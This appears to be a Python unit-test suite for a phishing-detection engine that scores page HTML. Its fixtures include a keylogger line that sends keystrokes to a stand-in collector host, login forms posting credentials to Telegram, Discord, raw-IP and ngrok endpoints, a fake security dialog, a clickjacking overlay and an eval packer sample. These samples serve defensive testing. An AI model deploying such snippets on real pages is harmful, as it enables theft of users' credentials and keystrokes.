"""
PhishGuard AI V7.0 — Temporal HTML/DOM Behavioral Intelligence Engine Test Suite
================================================================================
Comprehensive unit & integration tests verifying:
  1. Static HTML/DOM structural parsing fallback
  2. Suspicious webhook/exfiltration endpoint detection (Telegram, Discord, Formspree, etc.)
  3. Raw IP form action detection
  4. Temporal dynamic password injection detection (MutationObserver simulation)
  5. Temporal dynamic form action alteration detection
  6. Hidden credential field detection (display:none, opacity:0)
  7. Deceptive modal / fake browser dialog detection
  8. Clickjacking / fullscreen invisible overlay detection
  9. Cross-domain iframe credential trap detection
  10. Anti-debugging / devtools evasion detection
  11. Right-click contextmenu & selection suppression
  12. Keystroke logging / event interception
  13. Obfuscated eval/unescape packer detection
  14. Meta refresh redirect detection
  15. Clean legitimate website baseline verification
  16. Enterprise whitelist resilience (OAuth, CDN, Google Analytics)
  17. Standardized 24D ML feature vector consistency ([0.0, 1.0] bounds)
  18. Fusion engine integration: dynamic injection triggers ZERO_DAY_PHISHING
  19. Fusion engine backward compatibility: None/empty behavior does not disrupt voting
  20. Malformed / corrupted HTML robustness (no unhandled exceptions)
  21. Execution timing metrics present and positive
"""

import sys
import os
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from detection.dom_behavior_engine import analyze_dom_behavior
from detection.fusion_engine import fuse, build_evidence_vector


class TestDOMBehaviorEngine(unittest.TestCase):

    def test_01_empty_dom_handling(self):
        """Engine returns graceful unavailable payload on empty input without raising."""
        result = analyze_dom_behavior(dom_raw="", page_url="http://example.com")
        self.assertFalse(result["available"])
        self.assertEqual(result["dom_behavior_score"], 0.0)
        self.assertEqual(result["threat_level"], "SAFE")
        self.assertEqual(len(result["ml_feature_vector"]), 24)

    def test_02_clean_legitimate_page(self):
        """Benign landing page produces low risk score and SAFE threat level."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Legitimate Portal</title></head>
        <body>
            <header><h1>Welcome to Acme Cloud</h1></header>
            <main><p>Explore our cloud services and enterprise infrastructure.</p></main>
            <footer><p>&copy; 2026 Acme Corp</p></footer>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://acme-cloud.com")
        self.assertTrue(result["available"])
        self.assertLess(result["dom_behavior_score"], 20.0)
        self.assertEqual(result["threat_level"], "SAFE")
        self.assertEqual(len(result["indicators"]), 0)

    def test_03_telegram_bot_exfiltration(self):
        """Form action targeting Telegram Bot API is flagged as unauthorized exfiltration."""
        html = """
        <html>
        <body>
            <form action="https://api.telegram.org/bot123456:ABC-DEF/sendMessage" method="POST">
                <input type="text" name="username" placeholder="Email" />
                <input type="password" name="password" placeholder="Password" />
                <button type="submit">Log In</button>
            </form>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://security-notice-update.com")
        self.assertGreaterEqual(result["dom_behavior_score"], 45.0)
        self.assertIn("EXFILTRATION_ENDPOINT_DETECTED", result["indicators"])
        self.assertTrue(any("api.telegram.org" in target for target in result["form_exfiltration"]["suspicious_exfil_targets"]))

    def test_04_discord_webhook_exfiltration(self):
        """Form action targeting Discord webhook is flagged as critical exfiltration."""
        html = """
        <html>
        <body>
            <form action="https://discord.com/api/webhooks/1234567890/token" method="POST">
                <input type="email" name="user" />
                <input type="password" name="pwd" />
            </form>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://update-account-portal.com")
        self.assertIn("EXFILTRATION_ENDPOINT_DETECTED", result["indicators"])
        self.assertIn(result["threat_level"], ("HIGH", "CRITICAL", "MODERATE"))

    def test_05_raw_ip_form_action(self):
        """Form submission targeting a raw IP address is flagged as suspicious exfiltration."""
        html = """
        <html>
        <body>
            <form action="http://198.51.100.42/login.php" method="POST">
                <input type="password" name="auth_token" />
            </form>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://portal.bank-verify.com")
        self.assertTrue(len(result["form_exfiltration"]["suspicious_exfil_targets"]) > 0)
        self.assertIn("EXFILTRATION_ENDPOINT_DETECTED", result["indicators"])

    def test_06_temporal_dynamic_password_injection(self):
        """Simulation of Playwright VM observer detecting delayed password field insertion."""
        raw_ds = {
            "dom_snapshot": "<html><body><form><input type='password' name='pass'/></form></body></html>",
            "dom_behavior": {
                "temporal_snapshots": {"t0_password_count": 0, "t1_password_count": 1},
                "mutation_metrics": {"total_mutations": 14, "added_nodes": 3, "modified_attributes": 2},
                "behavioral_events": ["dynamic_password_injection"],
                "dynamic_password_injection": True,
            }
        }
        result = analyze_dom_behavior(raw_ds=raw_ds, page_url="https://delayed-auth-prompt.com")
        self.assertTrue(result["temporal_analysis"]["dynamic_password_injection"])
        self.assertIn("DYNAMIC_CREDENTIAL_INJECTION", result["indicators"])
        self.assertGreaterEqual(result["dom_behavior_score"], 35.0)

    def test_07_temporal_dynamic_form_action_mutation(self):
        """MutationObserver telemetry capturing post-load form action hijacking."""
        raw_ds = {
            "dom_snapshot": "<html><body><form action='https://evil-exfil.org/log'></form></body></html>",
            "dom_behavior": {
                "mutation_metrics": {"total_mutations": 8, "added_nodes": 0, "modified_attributes": 3},
                "behavioral_events": ["dynamic_form_action_mutated"],
                "dynamic_form_action_changed": True,
            }
        }
        result = analyze_dom_behavior(raw_ds=raw_ds, page_url="https://compromised-site.com")
        self.assertTrue(result["temporal_analysis"]["dynamic_form_action_changed"])
        self.assertIn("DYNAMIC_ACTION_MUTATION", result["indicators"])

    def test_08_hidden_credential_fields(self):
        """Hidden password inputs (CSS display:none or opacity:0) are detected."""
        html = """
        <html>
        <body>
            <input type="password" name="stealth_pass" style="display:none;" />
            <input type="text" name="stealth_user" style="opacity:0;" />
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://cloak-test.com")
        self.assertGreaterEqual(result["form_exfiltration"]["hidden_credential_fields"], 1)
        self.assertIn("HIDDEN_CREDENTIAL_COLLECTION", result["indicators"])

    def test_09_deceptive_fake_dialog(self):
        """Simulated OS or browser dialog boxes inside DOM are flagged."""
        html = """
        <html>
        <body>
            <div class="fake-dialog system-alert" style="z-index: 10000;">
                <h3>Windows Security Alert: Enter your password to continue</h3>
                <input type="password" name="sys_pwd" />
            </div>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://alert-notice.net")
        self.assertTrue(result["ui_deception"]["fake_dialog_detected"])
        self.assertIn("DECEPTIVE_BROWSER_MODAL", result["indicators"])

    def test_10_fullscreen_clickjacking_overlay(self):
        """Elevated z-index fullscreen overlay covering page viewport is detected."""
        html = """
        <html>
        <body>
            <div style="position: fixed; inset: 0; z-index: 99999; background: transparent;">
                <a href="https://phish.org">Click anywhere</a>
            </div>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://clickjack-test.com")
        self.assertTrue(result["ui_deception"]["hidden_overlay_detected"])
        self.assertIn("CLICKJACKING_OVERLAY_DETECTED", result["indicators"])

    def test_11_cross_domain_iframe_trap(self):
        """Third-party iframe designed to collect credentials triggers structural alert."""
        html = """
        <html>
        <body>
            <iframe src="https://untrusted-auth-service.xyz/login.html" style="width:100%; height:500px;"></iframe>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://innocent-host.com")
        self.assertTrue(result["ui_deception"]["iframe_credential_trap"])
        self.assertIn("CROSS_DOMAIN_IFRAME_CREDENTIALS", result["indicators"])

    def test_12_anti_debugging_detection(self):
        """Active anti-debugging routines (debugger loop / devtools detection) are caught."""
        html = """
        <html>
        <body>
            <script>
                setInterval(function() {
                    debugger;
                }, 100);
            </script>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://anti-inspect-site.com")
        self.assertTrue(result["script_evasion"]["anti_debugging_detected"])
        self.assertIn("ANTI_DEBUGGING_ACTIVE", result["indicators"])

    def test_13_context_menu_suppression(self):
        """Inline oncontextmenu suppression blocking right-click is flagged."""
        html = """
        <html>
        <body oncontextmenu="return false;" onselectstart="return false;">
            <h1>Protected Document</h1>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://protected-docs.com")
        self.assertTrue(result["script_evasion"]["contextmenu_suppressed"])
        self.assertIn("CONTEXT_MENU_SUPPRESSION", result["indicators"])

    def test_14_keystroke_interception(self):
        """Keylogger event listeners streaming input to network endpoints are identified."""
        html = """
        <html>
        <body>
            <script>
                window.addEventListener('keypress', function(e) {
                    fetch('https://collector.xyz/key?k=' + e.key);
                });
            </script>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://keylog-poc.com")
        self.assertTrue(result["script_evasion"]["keystroke_interception"])
        self.assertIn("KEYSTROKE_INTERCEPTION", result["indicators"])

    def test_15_eval_packer_obfuscation(self):
        """Dean Edwards packer or eval(unescape(...)) DOM assembly is detected."""
        html = """
        <html>
        <body>
            <script>
                eval(unescape('%3Cscript%3Ealert(1)%3C/script%3E'));
            </script>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://packed-script.com")
        self.assertTrue(result["script_evasion"]["eval_obfuscation"])
        self.assertIn("EVAL_PACKER_OBFUSCATION", result["indicators"])

    def test_16_meta_refresh_redirect(self):
        """Meta refresh client-side redirect headers in DOM are extracted."""
        html = """
        <html>
        <head>
            <meta http-equiv="refresh" content="0; url=https://evil-redirect.com/landing">
        </head>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://redirector.net")
        self.assertTrue(result["script_evasion"]["meta_refresh_detected"])
        self.assertIn("META_REFRESH_REDIRECT", result["indicators"])

    def test_17_enterprise_whitelist_resilience(self):
        """Verified enterprise domains using legitimate CDNs and Google OAuth stay clean."""
        html = """
        <html>
        <head>
            <script src="https://www.google-analytics.com/analytics.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
        </head>
        <body>
            <form action="https://accounts.google.com/o/oauth2/v2/auth" method="GET">
                <button type="submit">Sign in with Google</button>
            </form>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://company.internal", is_whitelisted=True)
        self.assertLessEqual(result["dom_behavior_score"], 5.0)
        self.assertEqual(result["threat_level"], "SAFE")
        self.assertEqual(len(result["form_exfiltration"]["suspicious_exfil_targets"]), 0)

    def test_18_standardized_24d_ml_vector(self):
        """ML feature vector has exact length 24, all floats bounded between 0.0 and 1.0."""
        html = """
        <html>
        <body>
            <form action="https://formspree.io/f/xyz" method="POST">
                <input type="password" name="p" />
                <input type="email" name="e" />
            </form>
        </body>
        </html>
        """
        result = analyze_dom_behavior(dom_raw=html, page_url="https://phish-form.com")
        vec = result["ml_feature_vector"]
        self.assertEqual(len(vec), 24)
        for val in vec:
            self.assertIsInstance(val, float)
            self.assertGreaterEqual(val, 0.0)
            self.assertLessEqual(val, 1.0)

    def test_19_fusion_zero_day_elevation(self):
        """Fusion Engine elevates verdict to ZERO_DAY_PHISHING when DOM behavior flags dynamic injection."""
        dom_behavior = {
            "available": True,
            "dom_behavior_score": 85.0,
            "temporal_analysis": {
                "dynamic_password_injection": True,
            },
            "form_exfiltration": {
                "suspicious_exfil_targets": ["https://api.telegram.org/bot"],
            },
            "ui_deception": {},
            "script_evasion": {},
        }
        # Run fuse with neutral signals
        fusion_res = fuse(dom_behavior=dom_behavior, is_whitelisted=False)
        self.assertEqual(fusion_res["classification"], "ZERO_DAY_PHISHING")
        self.assertGreaterEqual(fusion_res["risk_score"], 75.0)
        self.assertTrue(fusion_res["evidence_vector"]["dynamic_password_injection"])

    def test_20_fusion_backward_compatibility(self):
        """Calling fuse() without dom_behavior does not error and preserves baseline behavior."""
        fusion_res = fuse(is_whitelisted=False)
        self.assertIn(fusion_res["classification"], ("LEGITIMATE", "SUSPICIOUS", "KNOWN_PHISHING", "ZERO_DAY_PHISHING"))
        self.assertIn("dom_behavior_score", fusion_res["evidence_vector"])
        self.assertFalse(fusion_res["evidence_vector"]["dom_behavior_available"])

    def test_21_malformed_html_robustness(self):
        """Extremely corrupt and non-closing HTML strings do not crash the engine."""
        corrupted = "<<<<form action='https://ngrok-free.app/exfil' <<<>>><<<<input type=password name=<<>>"
        result = analyze_dom_behavior(dom_raw=corrupted, page_url="https://corrupt-markup.com")
        self.assertTrue(result["available"])
        self.assertIsInstance(result["dom_behavior_score"], float)
        self.assertIn("EXFILTRATION_ENDPOINT_DETECTED", result["indicators"])


if __name__ == "__main__":
    unittest.main()
